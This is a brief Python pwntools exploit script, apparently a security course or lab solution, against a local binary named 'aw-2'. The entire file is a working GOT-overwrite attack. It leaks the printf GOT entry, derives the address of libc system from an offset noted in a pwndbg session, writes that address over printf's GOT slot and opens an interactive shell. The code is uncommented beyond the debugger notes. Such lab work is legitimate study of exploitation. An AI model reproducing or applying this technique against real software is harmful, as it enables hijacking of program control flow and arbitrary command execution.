#!/usr/bin/env python

from pwn import *



env = {
        "PATH":"/home/users/didnera/week6/3-aw-2"
        }



p = process("./aw-2",env=env)

got_of_printf = p.elf.got['printf']
print("Got of printf %s" % hex(got_of_printf))



print(p.recv(timeout=0.1))

p.sendline("8")

print(p.recv(timeout=0.1))
p.sendline(hex(got_of_printf))


inputs = p.recv(timeout=0.1)
print(str(inputs[30:38]))
inputs = u64(inputs[30:38])
print("inputs: " + hex(inputs))


'''
pwndbg> print printf
$1 = {<text variable, no debug info>} 0x7f8f7b60a800 <__printf>
pwndbg> print system
$2 = {<text variable, no debug info>} 0x7f8f7b5fa390 <__libc_system>
'''

offset_between_system_and_printf = 0x7f8f7b60a800 - 0x7f8f7b5fa390
print(hex(offset_between_system_and_printf))
true =  inputs - offset_between_system_and_printf
print("true: "+ hex(true))



p.sendline("8")

print(p.recv(timeout=0.1))
p.sendline(hex(got_of_printf))
print(p.recv(timeout=0.1))
p.sendline(p64(true))
print(p.recv(timeout=0.1))




p.interactive()